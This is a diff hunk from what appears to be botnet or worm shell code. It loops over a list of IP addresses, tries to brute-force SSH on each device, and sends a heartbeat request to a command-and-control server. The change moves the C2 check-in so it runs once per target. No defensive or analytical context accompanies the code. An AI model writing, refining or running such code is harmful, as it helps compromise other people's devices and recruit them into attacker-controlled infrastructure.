@@ -100,8 +100,8 @@ do
 	echo ""
 	echo "SSH attempt"
 	echo ""
-    curl --request GET http://$cnc:$port/heartbeatdec
 	while IFS= read -r line; do
+    	curl --request GET http://$cnc:$port/heartbeatdec
 		echo "Brute forcing the device with IP $line"
 		sshTry $line
 		echo ""
